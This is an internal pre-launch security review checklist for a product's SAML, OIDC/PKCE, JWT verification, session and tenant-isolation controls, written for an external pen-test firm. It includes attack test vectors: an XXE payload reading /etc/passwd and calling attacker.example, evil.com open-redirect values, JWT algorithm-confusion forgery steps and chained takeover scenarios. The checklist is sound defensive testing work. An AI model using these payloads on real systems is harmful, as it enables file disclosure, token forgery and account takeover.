# Pre-Launch External Security Review Checklist — SAML & Auth Surface

**Ticket:** KAI-138
**Status:** Draft for external reviewer hand-off
**Owner:** lead-security
**Review type:** Pre-launch gate (not post-incident)
**Target reviewer:** External firm (expected: same firm engaged for KAI-390 pen test)
**Last updated:** 2026-04-08

---

## 0. Scope & State-of-the-World

### 0.1 Auth stack under review

| Surface | Technology | Location | Status |
|---|---|---|---|
| Cloud identity | Zitadel (self-hosted on EKS) | `internal/cloud/identity/zitadel/` | Integration in progress (KAI-131/132/133/220/221) |
| Enterprise federation | SAML 2.0 (delegated to Zitadel) | Zitadel `AddSAMLProvider` via adapter | Not yet wired end-to-end |
| Flutter client auth | OIDC + PKCE (S256) via `flutter_appauth` | `clients/flutter/` + KAI-297 | Landed (KAI-136, KAI-297) |
| API tokens | JWT RS256/ES256 via `golang-jwt/jwt/v5` | `internal/shared/auth/`, `internal/shared/streamclaims/verifier.go` | Verifier landed (KAI-129), awaiting security review (PR #167) |
| Authorization | Casbin RBAC + per-tenant policy | `internal/cloud/identity/` + KAI-145/146/235 | Partial |
| Session mgmt | Cookie + server-side revocation | Directory API | Revocation not yet landed (KAI-158) |
| Cross-tenant switching | Dedicated crosstenant service | `internal/cloud/identity/crosstenant/` | Landed |

### 0.2 Critical state note for the reviewer

**There is currently no in-process SAML assertion parser or validator in this repo.** All SAML assertion validation is delegated to Zitadel, which is acting as the SAML Service Provider. The Kaivue Go services never see a raw `<saml:Assertion>`. The reviewer's SAML-specific findings should therefore split into two buckets:

1. **Delegated to Zitadel** — the reviewer should audit the Zitadel deployment configuration (SP entityID, signing cert pinning, metadata handling). Kaivue can harden Zitadel config but cannot patch its SAML parser directly.
2. **Kaivue-owned** — the OIDC/JWT handoff from Zitadel to Kaivue services, session issuance, and tenant mapping.

If Kaivue later introduces a native Go SAML SP (e.g. `github.com/crewjam/saml` or `github.com/russellhaering/gosaml2`), **Section A of this checklist becomes directly applicable to Kaivue code**, and a re-review is required.

### 0.3 Out of scope for this review

- MediaMTX upstream RTSP/HLS/WebRTC auth (separate threat model — see `docs/compliance/pentest/media-surface.md` once written).
- Recorder-local auth between Recorder daemon and cameras (ONVIF basic/digest — tracked under KAI-141).
- Physical access control integrations (Brivo, OpenPath — KAI-403/404).

---

## Legend

Each checkable item uses the format:

> **[ID]** *Requirement* — **Test vector:** how the reviewer can prove it. **Expected:** what a passing result looks like. **Fail action:** severity if violated.

Severity scale: **Critical** (launch blocker), **High** (must fix pre-GA), **Medium** (fix within first release cycle), **Low** (tracked).

---

## A. SAML 2.0 Security Checklist

Based on: OWASP SAML Security Cheat Sheet, NIST SP 800-63C §5.2, ETSI TS 119 182-1 §6 (XMLDSig profile), and the Duo Labs "SAML raider" class of attacks.

> **Applies to:** Zitadel SAML SP config + any future Kaivue-native SAML code. Each item is marked **[Z]** (reviewer must audit Zitadel config), **[K]** (Kaivue code must demonstrate), or **[Z+K]** (both).

### A.1 XML Signature Wrapping (XSW)

- [ ] **A.1.1 [Z]** SAML library version is current and patched against the known 8 XSW variants (XSW1–XSW8). Confirm Zitadel's underlying SAML parser is at a release post-CVE-2022-41912 / CVE-2017-11427 fixes.
  - **Test vector:** reviewer submits XSW1 through XSW8 crafted responses using the SAML Raider tooling (`https://github.com/CompassSecurity/SAMLRaider`) against the staging ACS URL. The mock IdP keys permit re-signing after wrapping.
  - **Expected:** all 8 variants rejected with an authentication failure; no session issued; audit log contains a SAML validation error.
  - **Fail action:** **Critical.**

- [ ] **A.1.2 [Z]** Signature reference (`<ds:Reference URI="...">`) must resolve to the *same DOM element* that is ultimately consumed as the assertion.
  - **Test vector:** craft a response with two assertions where `<ds:Reference URI="#A">` signs assertion A but the parser is induced to consume assertion B via ID duplication.
  - **Expected:** reject with a signature-scope mismatch error.
  - **Fail action:** **Critical.**

- [ ] **A.1.3 [Z]** Reject SAML Responses containing multiple `<saml:Assertion>` elements where only one is signed.
  - **Fail action:** **Critical.**

- [ ] **A.1.4 [Z]** Reject assertions wrapped inside `<Extensions>`, `<Object>`, or duplicated within the document tree.
  - **Test vector:** wrap the original signed assertion inside a `<ds:Object>` element and attach a second forged unsigned assertion at the top level.
  - **Expected:** reject.
  - **Fail action:** **Critical.**

- [ ] **A.1.5 [K]** If Kaivue ever exposes a raw-assertion debug/testing endpoint, it must NOT be reachable in production (compile-time build tag or config-gated with startup panic in prod mode).
  - **Test vector:** curl `/debug/saml/assert` on staging-prod build.
  - **Expected:** 404 or build-time absence.
  - **Fail action:** **High.**

### A.2 Signature Validation

- [ ] **[Z]** Unsigned assertions are rejected outright. Response-level signature alone is insufficient if assertions are consumed — prefer assertion-level signature OR enforce response signature with strict XSW countermeasures.
- [ ] **[Z]** IdP signing certificate is **pinned from metadata** at provider onboarding time. No Trust-On-First-Use. Changes to the signing cert require an admin-initiated rotation flow (audited).
- [ ] **[Z]** Certificate chain validation: if the metadata provides a cert chain, validate to a configured trust anchor; if metadata provides only a leaf cert, pin the leaf and document that chain validation is N/A.
- [ ] **[Z]** Expired certs are rejected. There is no "warn and allow" mode.
- [ ] **[Z]** Revocation: CRL/OCSP checking is **documented as N/A** for pinned enterprise IdP certs (standard industry practice). Mitigation: short metadata refresh cadence + admin rotation flow. This decision must be recorded in the threat model.

### A.3 XMLDSig Algorithm Allowlist

- [ ] **[Z]** Signature algorithm allowlist: `rsa-sha256`, `rsa-sha384`, `rsa-sha512`, `ecdsa-sha256`, `ecdsa-sha384`, `ecdsa-sha512`. All others rejected.
- [ ] **[Z]** **Explicitly reject**: `rsa-sha1`, `dsa-sha1`, `hmac-sha1`, `hmac-sha256` (HMAC implies a shared secret, which is inappropriate for federation and signals a misconfigured or malicious IdP).
- [ ] **[Z]** Digest algorithm allowlist: `sha256`, `sha384`, `sha512`. Reject `sha1` and `md5`.
- [ ] **[Z]** Canonicalization method: `xml-exc-c14n` (exclusive) is required. Reject inclusive C14N where possible (XSW hardening).

### A.4 XML Parser Hardening

- [ ] **A.4.1 [Z]** XML parser has **external entity expansion disabled** (XXE).
  - **Test vector:** submit a SAML response prefixed with `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>` and reference `&x;` inside an attribute. Also test HTTP-based external entity: `SYSTEM "http://attacker.example/xxe"`.
  - **Expected:** parser rejects the document OR strips the entity without dereferencing it. Reviewer's attacker-controlled HTTP server sees zero inbound requests from Zitadel / Kaivue.
  - **Fail action:** **Critical** (data exfiltration risk).

- [ ] **A.4.2 [Z]** Parser has **DTD processing disabled** entirely. Even without external entities, internal DTDs can drive billion-laughs.
  - **Fail action:** **High.**

- [ ] **A.4.3 [Z]** **Billion Laughs / XML bomb** protection: entity expansion depth and output size capped. Reject documents exceeding 1 MB post-decompression.
  - **Test vector:** 10-level nested entity expansion targeting >1 GB logical expansion.
  - **Expected:** parser aborts within a bounded memory ceiling (≤50 MB) and returns an error within 1 s.
  - **Fail action:** **Critical** (DoS).

- [ ] **A.4.4 [Z]** **XInclude** processing disabled.
  - **Fail action:** **High.**

- [ ] **A.4.5 [Z]** SAML Response deflate-decode is bounded (reject >1 MB inflated, >10:1 compression ratio).
  - **Test vector:** HTTP-Redirect binding with a highly compressible deflated payload that expands to 500 MB.
  - **Expected:** rejection before full inflation.
  - **Fail action:** **High** (DoS).

### A.5 Replay Protection

- [ ] **A.5.1 [Z+K]** Assertion `ID` is tracked against a replay cache for the full `NotOnOrAfter` window (max 5 min after issuance). Replay cache is durable across restarts (Redis / DB, not in-memory only).
  - **Test vector:** capture a valid assertion post-auth, then replay the exact same POST body to the ACS endpoint within the NotOnOrAfter window.
  - **Expected:** first request succeeds; replay returns 401 and emits audit event `saml.replay_detected`.
  - **Fail action:** **High.**

- [ ] **A.5.2 [Z+K]** Replay cache is **per-tenant-per-IdP scoped** — no cross-tenant collision possible.
  - **Test vector:** ensure tenant A's assertion ID cannot poison tenant B's replay check (collision would manifest as tenant B rejecting unrelated valid assertions).
  - **Fail action:** **Medium** (correctness more than security, but noted).

- [ ] **A.5.3 [K]** Replay attempts are logged to the audit log (`internal/nvr/audit` / cloud audit) with `severity=warn` and include source IP, tenant, IdP entityID, and assertion ID hash (not raw).
  - **Fail action:** **Medium.**

### A.6 Assertion Content Validation

- [ ] **[Z]** `<saml:Audience>` restriction matches the configured SP entityID **exactly** (no substring, no prefix).
- [ ] **[Z]** `<saml:SubjectConfirmationData Recipient="...">` matches the ACS URL exactly.
- [ ] **[Z]** `NotBefore` and `NotOnOrAfter` are validated with ≤5 min clock skew tolerance. Document the skew value.
- [ ] **[Z]** `<saml:Conditions NotOnOrAfter>` validated independently of the `SubjectConfirmationData` time window.
- [ ] **[Z+K]** `InResponseTo` matches a pending `AuthnRequest` ID that Kaivue (or Zitadel-on-behalf-of-Kaivue) issued. Unsolicited responses are rejected unless IdP-initiated flow is explicitly enabled per-provider.
- [ ] **[Z]** `<saml:Issuer>` matches the configured IdP entityID (not just the signing cert — both checks required).
- [ ] **[Z]** `AuthnContextClassRef` is recorded in the session but not used for authorization decisions unless the tenant has explicitly opted in (step-up auth).

### A.7 RelayState

- [ ] **[Z+K]** `RelayState` length ≤ 80 bytes (SAML 2.0 spec maximum).
- [ ] **[Z+K]** `RelayState` is validated against an **allowlist of internal return paths**. Absolute URLs and protocol-relative URLs (`//evil.com`) rejected.
- [ ] **[K]** Open-redirect test: deliberate `RelayState=https://evil.com` must route to default landing page, not to `evil.com`.

### A.8 Metadata & Cert Rotation

- [ ] **[Z]** Metadata is refreshed on a schedule (recommended: every 6 h) AND on admin demand.
- [ ] **[Z]** Metadata signature (if signed by the IdP) is verified before acceptance.
- [ ] **[Z]** Signing cert rotation: admin flow allows staging a new cert alongside the old for a grace window. Audit log records rotation.
- [ ] **[Z]** Metadata URL fetch is performed over HTTPS with cert pinning OR from a locally uploaded XML file.

### A.9 Single Logout (SLO)

SLO is **optional** for Kaivue v1. If implemented:

- [ ] **[Z]** `<samlp:LogoutRequest>` signature required and validated identically to assertions.
- [ ] **[Z+K]** Session is invalidated server-side (KAI-158) on SLO — cookie deletion alone is insufficient.
- [ ] **[Z]** SLO replay protection uses the same replay cache as assertions.

---

## B. OIDC + PKCE Checklist (Flutter + any OIDC RP surface)

Relevant code: `clients/flutter/`, KAI-297, KAI-136, `internal/cloud/identity/zitadel/adapter.go`.

- [ ] **B.1 [K]** PKCE `code_challenge_method=S256` is **mandatory**. Reject `plain` at the token endpoint and document the rejection path.
  - **Test vector:** initiate an auth request with `code_challenge_method=plain`.
  - **Expected:** 400 / rejection before the authorization endpoint renders consent.
  - **Fail action:** **High.**
- [ ] **[K]** `state` parameter is a cryptographically random ≥128-bit value, bound to the client session (cookie or secure storage), and verified on callback. Mismatch → CSRF reject + audit log.
- [ ] **[K]** `nonce` parameter is present in the auth request, returned in the ID token, and verified on callback. A per-session nonce replay cache prevents reuse (5 min window).
- [ ] **[K]** `redirect_uri` is compared **exact-match** against an allowlist. Wildcards forbidden. `localhost` redirect URIs permitted **only** in dev/test builds (compile-time gated).
- [ ] **[K]** Custom URL scheme redirects (Flutter iOS/Android) are documented and pinned per-tenant per-app (KAI-297 landed with platform URL schemes + production overrides — confirm no dev-scheme leakage into prod build).
- [ ] **[K]** ID token `alg` allowlist is identical to API JWT allowlist (see Section C). `nonce`, `aud`, `iss`, `exp`, `iat` validated.
- [ ] **[K]** Access token lifetime ≤ 15 min. Refresh token lifetime configurable per-tenant, default 30 d.
- [ ] **[K]** **Refresh token rotation** is enabled: each refresh issues a new refresh token and invalidates the previous one. Reuse of a rotated token triggers session revocation on the entire chain (breach detection).
- [ ] **[K]** `offline_access` scope is gated by admin policy; not granted by default. Audit log records grant.
- [ ] **[K]** Token endpoint is **not** reachable unauthenticated from the public internet beyond the OAuth flow (no credential grant in this v1).
- [ ] **[K]** DPoP / token binding is **tracked as a future enhancement** (post-v1). Record decision in threat model.
- [ ] **[K]** Flutter secure token storage uses Keychain (iOS) / Keystore (Android) with `first_unlock_this_device_only` accessibility — confirm KAI-298 landing included this fix (blocker ticket #153 is pending review).

---

## C. JWT TokenVerifier Checklist

Primary code: `internal/shared/streamclaims/verifier.go` (stream tokens, RS256-only, zero-leeway — verified) and the broader Directory/Recorder/Gateway `TokenVerifier` delivered in KAI-129 (PR #167, pending lead-security review per ticket #156).

- [ ] **C.1 [K]** `alg` allowlist enforced at parse time: `RS256`, `RS384`, `RS512`, `ES256`, `ES384`. **Explicitly reject** `none`, `HS256`, `HS384`, `HS512`. Library-level enforcement (`jwt.WithValidMethods`) required — do **not** rely on post-parse `if token.Method == ...` checks, which are subject to type-confusion when an attacker submits an HS256 token signed with the RSA public key as the HMAC secret.
  - **Code reference:** `internal/shared/streamclaims/verifier.go:107` uses `jwt.WithValidMethods([]string{jwt.SigningMethodRS256.Alg()})` — this is the correct pattern. Confirm the KAI-129 Directory TokenVerifier (PR #167) follows the same library-level pattern.
  - **Test vector:** forge three tokens: (a) `alg:none`, (b) `alg:HS256` signed with the RSA public key, (c) `alg:RS256` but with `alg` in the body not header.
  - **Expected:** all three rejected before any claim validation runs.
  - **Fail action:** **Critical.**
- [ ] **[K]** `kid` header is **required**. Tokens without `kid` are rejected.
- [ ] **[K]** JWKS fetched from issuer-published endpoint over HTTPS. Response TTL ≥ 5 min, ≤ 15 min.
- [ ] **[K]** JWKS cache **poisoning protection**: a JWKS refresh that returns a key with a `kid` matching an existing pinned key but a different public key triggers an alert and does not overwrite silently.
- [ ] **[K]** JWKS refresh on `kid`-miss is rate-limited (e.g. once per 10 s per issuer) to prevent unknown-kid DoS.
- [ ] **[K]** Standard claim validation: `iss` (exact match to configured issuer), `aud` (exact match, string or array), `exp` (required), `nbf` (if present), `iat` (sanity-check: not more than 5 min in the future).
- [ ] **[K]** Clock skew ≤ 2 min for general API tokens. **Zero leeway** for stream tokens (already enforced in `streamclaims/verifier.go:106`).
- [ ] **[K]** `jti` tracking: for high-value tokens (admin elevation, cross-tenant switch), `jti` is recorded and single-use enforced via Redis / bloom filter (KAI-257 landed).
- [ ] **[K]** Key rotation grace period: old signing key remains in JWKS for ≥ 1× max token lifetime after rotation.
- [ ] **[K]** Required custom claims validated for multi-tenancy: `tenant_id`, `user_id`, `roles`. Missing → reject.
- [ ] **[K]** Error messages are **generic** on the wire (`401 unauthorized`) but structured in logs.

---

## D. Session Management

- [ ] **[K]** Session cookies: `HttpOnly=true`, `Secure=true`, `SameSite=Strict` for admin console. `SameSite=Lax` permitted **only** for OIDC redirect callback paths, with an inline code comment explaining the relaxation.
- [ ] **[K]** Cookie `Domain` is set explicitly (no subdomain wildcarding unless required by white-label KAI-356).
- [ ] **[K]** Cookie `Path=/` and cookie names are non-descriptive (`__Host-` prefix where origin binding is feasible).
- [ ] **[K]** **Session fixation prevention**: session ID is regenerated on login (pre-auth anonymous session ID is invalidated and a new authenticated ID issued).
- [ ] **[K]** Session has both an **idle timeout** (default 30 min) and an **absolute timeout** (default 12 h). Both configurable per-tenant.
- [ ] **[K]** **Server-side revocation** exists (KAI-158 — currently pending, ticket #134). External reviewer must be told this is a known gap and scheduled.
- [ ] **[K]** Logout invalidates the session record server-side, not just the cookie.
- [ ] **[K]** Concurrent session policy documented (default: unlimited per user, per-tenant override to cap).

---

## E. Multi-Tenant Boundary

Reference implementations: `internal/cloud/identity/crosstenant/service.go`, Casbin integration (KAI-145/235).

- [ ] **[K]** JWT `tenant_id` claim is extracted by middleware and **structurally propagated into every DB query** via a context-scoped tenant filter. Reviewer should request a grep for `WHERE tenant_id` vs. total query count — divergence is a finding.
- [ ] **[K]** No code path allows constructing a DB query without the tenant filter. Enforced by either (a) a query builder wrapper, (b) row-level security in Postgres, or (c) a static analysis gate in CI. Document which.
- [ ] **[K]** Casbin policy is loaded **per-tenant**, not globally. Policy reload on tenant modification does not leak into other tenants.
- [ ] **[K]** Token swap attack: attempting to present a JWT for tenant A to an endpoint scoped to tenant B returns 403, not 404, and does not leak tenant B existence beyond what's already public.
- [ ] **[K]** Cross-tenant session switching (`crosstenant` service) requires: (a) prior authN in source tenant, (b) explicit grant in target tenant, (c) audit log entry in **both** tenants, (d) new session ID minted (no session reuse).
- [ ] **[K]** Tenant IDs in URLs/logs/error messages do not leak information about tenants the caller does not belong to.
- [ ] **[K]** Shared infrastructure (Redis keys, S3/R2 prefixes, vector index namespaces) is prefixed with `tenant_id` and reviewed for collision.
- [ ] **[K]** Tenant deletion is **soft** with an encrypted tombstone; hard-delete requires dual-admin approval and purges encryption keys (cryptographic erasure).

---

## F. External Reviewer Package

### F.1 Documents to provide

| Doc | Path | Owner | Status |
|---|---|---|---|
| Architecture overview | `docs/superpowers/specs/2026-04-07-v1-roadmap.md` | tech-lead | Exists |
| Auth threat model | `docs/compliance/reviews/auth-threat-model.md` | lead-security | **TO BE WRITTEN before review** |
| This checklist | `docs/compliance/saml-review/checklist.md` | lead-security | Draft (this doc) |
| Zitadel deployment topology | `docs/compliance/soc2/zitadel-topology.md` | lead-security | **TO BE WRITTEN** |
| Pen test scope (KAI-390) | `docs/compliance/pentest/scope.md` | lead-security | In progress (#44) |
| SBOM | `sbom.spdx.json` (from KAI-428 pipeline) | lead-build | Landed |
| Source access scope | This document §F.3 | lead-security | Below |

### F.2 Test accounts & fixtures

The reviewer will receive:

- **2 tenants** (`acme-corp`, `initech`) on a dedicated staging environment distinct from customer staging.
- **Per tenant**: 1 tenant-admin account, 1 regular user account, 1 read-only auditor account.
- **Federated IdP mock**: a SimpleSAMLphp or `crewjam/saml` mock IdP pre-configured as the enterprise IdP for `acme-corp`. Mock IdP signing keys are provided so the reviewer can forge arbitrary assertions for XSW/replay testing.
- **OIDC mock**: Zitadel staging instance with dev credentials scoped to the two test tenants only.
- **API keys**: 1 per-tenant API key with `read:cameras` scope for black-box testing (KAI-400 issuance flow).
- **Flutter build**: a staging-signed IPA and APK with the staging redirect URI.

### F.3 Source access scope

The reviewer gets **read-only** git access to the following paths:

- `internal/shared/auth/**`
- `internal/shared/streamclaims/**`
- `internal/shared/cryptostore/**`
- `internal/cloud/identity/**`
- `internal/cloud/apiserver/**` (auth middleware)
- `clients/flutter/lib/auth/**`
- `docs/compliance/**`

Out of scope for source review (black-box only):

- `internal/nvr/**` (separate review cycle)
- MediaMTX upstream code (`internal/core`, `internal/protocols/**`) — already public.
- Infrastructure Terraform (`infra/terraform/**`) — separate cloud-infra review.

### F.4 Out-of-scope items (hard exclusions)

- Physical pen test of office / datacenter.
- Social engineering of Kaivue employees.
- DoS testing against production or shared-staging environments. Dedicated reviewer-only staging only.
- Third-party integrations (Stripe, Avalara, Brivo, OpenPath) — reviewer may audit the integration code but not pen-test the third-party endpoint.
- Zitadel internal code (trust the upstream project; audit only our config + adapter).

### F.5 Vulnerability disclosure & communication

- **Primary channel**: encrypted email to `security@kaivue.example` (PGP key fingerprint in `docs/compliance/reviews/pgp.asc`, to be published).
- **Urgent channel**: dedicated Signal group; credentials delivered out-of-band at kickoff.
- **Severity SLA**:
  - Critical: initial response ≤ 4 h, fix or mitigation ≤ 72 h, reviewer re-test before public disclosure.
  - High: ≤ 24 h response, ≤ 7 d fix.
  - Medium/Low: ≤ 3 business days response, addressed in normal sprint cadence.
- **Disclosure**: reviewer publishes findings 90 days after fix acceptance, coordinated with Kaivue marketing for trust-center update (KAI-394).
- **No-fault clause**: findings made during the engagement cannot be used as grounds for contract termination with the reviewer, per standard pen-test MSA.

---

## G. Gate Criteria (Pre-Launch)

The external review is considered **passed** and v1 may launch when all of the following are true:

1. Zero open Critical findings.
2. Zero open High findings in Sections A (SAML) and C (JWT).
3. All Medium findings in Sections D/E have an assigned ticket and a committed fix-by date.
4. Re-test confirmation from the reviewer on every Critical and High finding.
5. lead-security sign-off recorded in `docs/compliance/reviews/kai-138-signoff.md`.
6. Linear ticket KAI-138 moved to Done with the signed report attached.

---

## H. Known Gaps the Internal Team Owes Before Review Kickoff

Flagged for leadership attention — see report summary below.

1. **KAI-158 (force-revocation)** is pending. Session revocation is a Section D requirement; reviewer will flag its absence as High. Either land KAI-158 or document the acceptance window.
2. **KAI-153 (Flutter Keychain accessibility + 401 ordering test)** is pending. Reviewer will attempt token extraction from a locked device.
3. **Zitadel topology doc + auth threat model do not exist yet.** Section F.1 lists both as "TO BE WRITTEN." Review cannot start without these.

---

## Appendix I — Attacker Scenarios the Review Must Exercise

The reviewer is expected to attempt these end-to-end scenarios in addition to the per-item test vectors above. Each scenario is a chained attack across multiple checklist items.

### I.1 "Federated tenant takeover via XSW + stale metadata"

**Attacker goal:** assume the identity of tenant-admin for `acme-corp` without possessing tenant-admin credentials.

**Attack chain:**
1. Harvest a valid SAML response for any low-privilege user in `acme-corp` (e.g. via a legitimate login by an attacker-controlled test account, or network capture in a lab environment where the staging tenant's mock IdP is reachable).
2. Apply XSW4 wrapping to inject a forged `<saml:Attribute Name="Role">admin</saml:Attribute>` block while preserving the original signed subtree.
3. Replay the wrapped response to the ACS endpoint.
4. On success, pivot via the resulting session cookie to `/api/v1/admin/*` endpoints.

**Checklist items exercised:** A.1.1–A.1.4, A.5.1, A.6 (role mapping), E (tenant boundary), D (session issuance).

**Pass criteria:** every stage except stage 1 fails. Stage 3 returns a SAML validation error. The audit log shows both the initial legitimate login and the XSW attempt as distinct events.

### I.2 "JWT algorithm confusion against the Recorder"

**Attacker goal:** mint a valid-looking access token without possessing the Directory signing key.

**Attack chain:**
1. Fetch the Directory JWKS endpoint (public, unauthenticated).
2. Extract the RSA public key.
3. Forge a JWT with `alg:HS256`, signing it with the RSA public key bytes as the HMAC secret. Set `tenant_id` and `roles` to match a high-privilege user.
4. Present the token to a Recorder endpoint.

**Checklist items exercised:** C.1 (alg allowlist), C.2 (kid handling), C.5 (issuer/audience).

**Pass criteria:** token is rejected at the library level. No downstream code path sees the forged claims.

### I.3 "Cross-tenant session theft via tenant parameter swap"

**Attacker goal:** with a valid session cookie for tenant A, read data from tenant B.

**Attack chain:**
1. Legitimately authenticate to tenant A.
2. Identify an API endpoint that accepts a tenant ID in the URL or body (e.g. `/api/v1/tenants/{tid}/cameras`).
3. Submit the request with tenant B's ID while carrying the tenant A session cookie.
4. Alternatively, attempt to decode and modify the JWT body (without re-signing), relying on a server that does not re-verify the signature.

**Checklist items exercised:** E.1, E.2, E.4, C.1, C.5.

**Pass criteria:** 403 Forbidden in all variants. Audit log captures cross-tenant access attempt. No data from tenant B returned.

### I.4 "Refresh token replay after logout"

**Attacker goal:** with a captured refresh token, mint new access tokens after the user has explicitly logged out.

**Attack chain:**
1. Legitimately authenticate as a Flutter client user.
2. Extract the refresh token from the device (simulate malware with Keychain access).
3. User logs out via the app; server-side session is invalidated.
4. Attacker presents the stale refresh token to the token endpoint.

**Checklist items exercised:** B (refresh rotation), D.6 (server-side revocation — KAI-158 dependency).

**Pass criteria:** stage 4 fails with `invalid_grant`. This item is **known-gap-acknowledged** if KAI-158 has not landed by review kickoff; reviewer must record it as such rather than as a fresh finding.

### I.5 "Open redirect via RelayState to credential-harvesting site"

**Attacker goal:** send a phishing link that, after a legitimate login, bounces the user to an attacker-controlled site that mimics the Kaivue post-login dashboard to harvest additional credentials (e.g. a linked Stripe or Google login).

**Attack chain:**
1. Craft an IdP-initiated SAML login URL with `RelayState=https://evil.kaivue.example/dashboard`.
2. Send to victim; victim logs in legitimately.
3. After successful assertion validation, Kaivue issues a redirect to the attacker URL.

**Checklist items exercised:** A.7.1–A.7.3.

**Pass criteria:** redirect is clamped to the default internal landing page regardless of `RelayState` value. Audit log records the attempted off-host redirect.

---

## Appendix II — Reviewer Tooling & Fixtures

The following tooling is pre-staged in the reviewer sandbox:

- **SAML Raider** (Burp extension) — pre-loaded with the mock IdP signing keys for `acme-corp`.
- **`saml-ws-attacker`** — Java CLI for XSW fuzzing.
- **`jwt_tool`** (github.com/ticarpi/jwt_tool) — for JWT forgery and algorithm confusion.
- **Mock IdP**: SimpleSAMLphp instance reachable at `https://mock-idp.staging.kaivue.example` with a known signing key pair. The reviewer may re-sign arbitrary assertions.
- **Zitadel admin console**: read-only account provided so the reviewer can inspect configured IdPs, attribute mappings, and signing certs without the ability to modify them.
- **Postgres snapshot**: a sanitized snapshot of the staging Directory DB, restorable on demand, so destructive testing can be rolled back.
- **Log aggregator**: pre-configured Loki + Grafana pointing at the review tenants so the reviewer can verify audit log emissions in real time.

---

## Appendix III — Trust Boundary Diagram Pointers

(Full diagrams live in the threat model doc once written; this is an inventory of the boundaries the reviewer should be aware of.)

1. **Public internet → Zitadel front door** (ALB in front of Zitadel pods on EKS).
2. **Zitadel → Kaivue Directory API** (OIDC token exchange over internal service mesh, mTLS optional).
3. **Kaivue Directory → Recorder** (outbound Connect-Go RPC; tokens flow via `streamclaims` verifier).
4. **Flutter client → Directory** (OIDC/PKCE; access tokens in memory, refresh tokens in Keychain/Keystore).
5. **Flutter client → Recorder** (direct LAN or via Gateway; token issued by Directory).
6. **Admin React console → Directory** (cookie session, same origin).
7. **Cross-tenant switch** (`crosstenant` service — boundary within Directory).

Each boundary has a corresponding checklist section above. The reviewer should explicitly confirm that boundary 4→5 (Flutter direct to Recorder) cannot be used to bypass the Directory's tenant filter, since Recorders terminate JWT verification locally against a JWKS fetched from Directory.

---

*End of checklist.*
